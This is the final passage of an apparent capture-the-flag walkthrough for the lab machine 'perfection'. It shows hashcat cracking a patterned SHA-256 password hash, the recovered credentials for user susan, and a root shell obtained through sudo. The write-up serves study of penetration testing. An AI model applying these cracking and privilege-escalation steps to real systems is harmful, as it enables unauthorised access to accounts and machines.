</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
</span></span></span><span class=line><span class=cl><span class=go>Candidate.Engine.: Device Generator
</span></span></span><span class=line><span class=cl><span class=go>Candidates.#1....: susan_nasus_126824210 -&gt; susan_nasus_722759210
</span></span></span><span class=line><span class=cl><span class=go>Hardware.Mon.#1..: Util: 50%
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Started: Fri May 24 01:52:00 2024
</span></span></span><span class=line><span class=cl><span class=go>Stopped: Fri May 24 01:54:49 2024
</span></span></span></code></pre></div><p>and we find a password:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ hashcat -a 3 -m 1400 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f &#34;susan_nasus_?d?d?d?d?d?d?d?d?d&#34; --show
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210
</span></span></span></code></pre></div><p>so we have the credentials <code>susan:susan_nasus_413759210</code>.</p><p>As we saw previously, this user was a member of <code>sudo</code> group. Now that we have a password we can just spawn a shell as <code>root</code> user, for example running:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>susan@perfection:~/ruby_app$ sudo /bin/bash
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[sudo] password for susan:
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>root@perfection:/home/susan/ruby_app# whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>root
</span></span></span></code></pre></div><p>and that&rsquo;s it. We can read the <code>root</code> flag at <code>/root</code> directory.</p><p>~Happy Hacking</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>